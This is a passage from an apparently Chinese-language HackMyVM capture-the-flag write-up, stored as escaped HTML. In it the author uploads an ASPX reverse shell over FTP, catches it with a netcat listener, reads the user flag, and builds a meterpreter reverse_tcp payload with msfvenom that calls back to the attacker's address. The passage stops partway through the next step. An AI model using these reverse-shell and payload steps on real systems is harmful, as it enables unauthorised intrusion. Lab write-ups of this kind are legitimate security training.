cimg src=\"/post-images/HackMyVMquoted/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这下目标明确了，通过Wappalyzer可以知道使用的是ASP ，我们直接上传\u003ccode\u003easp\u003c/code\u003e马\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx\"\u003ehttps://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e命名为4.aspx并上传\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eftp\u003e put \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003easpx\nlocal: \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003easpx remote: \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003easpx\n\u003cspan class=\"hljs-number\"\u003e229\u003c/span\u003e Entering Extended Passive \u003cspan class=\"hljs-title function_\"\u003eMode\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(|||\u003cspan class=\"hljs-number\"\u003e49159\u003c/span\u003e|)\u003c/span\u003e\n125 Data connection already open; Transfer starting.\n\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% |*****************************************************************| \u003cspan class=\"hljs-number\"\u003e15971\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e13.53\u003c/span\u003e MiB/s    --:-- ETA\n\u003cspan class=\"hljs-number\"\u003e226\u003c/span\u003e Transfer complete.\n\u003cspan class=\"hljs-number\"\u003e15971\u003c/span\u003e bytes sent in \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e5.85\u003c/span\u003e MiB/s)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003enc\u003c/code\u003e监听，然后\u003ccode\u003ecurl\u003c/code\u003e上传的ASP马,成功反弹回来\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e                                            \nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.6\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.4\u003c/span\u003e] from (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.6\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e49160\u003c/span\u003e\nSpawn Shell...\nMicrosoft Windows [Srm \u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e]\nTelif \u003cspan class=\"hljs-title function_\"\u003eHakk\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(c)\u003c/span\u003e 2009 Microsoft Corporation. Tm haklar sakldr.\n\nc:\\windows\\system32\\inetsrv\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e首先读取用户的\u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ec:\\Users\\quoted\\Desktop\u003etype user.txt\ntype user.txt\nHMV{User_Flag_Obtained}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eHMV{User_Flag_Obtained}\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e尝试读取administrator用户\u003ccode\u003eflag\u003c/code\u003e但是提示无权限，因为靶机windows版本较老，我们将会话迁移到msf上\u003c/p\u003e\n\u003cp\u003e首先创建反弹shell的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsfvenom -p windows/meterpreter/reverse_tcp lport=\u003cspan class=\"hljs-number\"\u003e1235\u003c/span\u003e lhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.4\u003c/span\u003e -f exe \u003e shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后通过\u003ccode\u003eftp\u003c/code\u003e上传，并且\u003ccode\
